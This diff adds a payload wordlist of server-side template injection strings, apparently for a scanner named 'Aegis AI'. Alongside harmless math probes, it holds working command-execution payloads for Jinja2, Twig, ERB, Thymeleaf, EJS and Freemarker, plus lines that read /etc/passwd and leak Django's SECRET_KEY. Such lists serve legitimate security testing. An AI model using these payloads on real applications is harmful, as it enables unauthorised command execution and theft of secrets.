@@ -1,0 +1,62 @@
+# ──────────────────────────────────────────────────────────────────
+# Aegis AI — Server-Side Template Injection (SSTI) Payloads
+# Lines starting with # are comments. Blank lines are ignored.
+# ──────────────────────────────────────────────────────────────────
+
+# ── Generic probes (math evaluation) ────────────────────────────
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+{{7*'7'}}
+*{7*7}
+@(7*7)
+
+# ── Jinja2 / Flask ──────────────────────────────────────────────
+{{config}}
+{{config.__class__}}
+{{''.__class__.__mro__}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__init__.__globals__['os'].popen('id').read()}}
+{{lipsum.__globals__['os'].popen('id').read()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{% for x in ''.__class__.__mro__[1].__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}
+
+# ── Django ───────────────────────────────────────────────────────
+{% debug %}
+{{settings.SECRET_KEY}}
+{% load log %}{% get_admin_log 10 as log %}{% for e in log %}{{e.object_repr}}{% endfor %}
+
+# ── Twig (PHP) ───────────────────────────────────────────────────
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{['id']|filter('system')}}
+{{['cat /etc/passwd']|filter('system')}}
+
+# ── ERB (Ruby) ───────────────────────────────────────────────────
+<%= system('id') %>
+<%= `id` %>
+<%= IO.popen('id').readlines() %>
+
+# ── Thymeleaf (Java/Spring) ─────────────────────────────────────
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${#rt = @java.lang.Runtime@getRuntime(),#rt.exec('id')}
+
+# ── EJS (Node.js) ───────────────────────────────────────────────
+<%= global.process.mainModule.require('child_process').execSync('id') %>
+
+# ── Freemarker (Java) ───────────────────────────────────────────
+<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id")}
+${object.getClass().forName("java.lang.Runtime").getRuntime().exec("id")}
+
+# ── Velocity (Java) ─────────────────────────────────────────────
+#set($x='')##
+#set($rt = $x.class.forName('java.lang.Runtime'))##
+#set($chr = $x.class.forName('java.lang.Character'))##
+#set($str = $x.class.forName('java.lang.String'))##
+
+# ── Pebble (Java) ───────────────────────────────────────────────
+{% set cmd = 'id' %}{{ cmd }}
+
+# ── Polyglot detection probes ───────────────────────────────────
+${{<%[%'"}}%\
+{{constructor.constructor('return 1')()}}
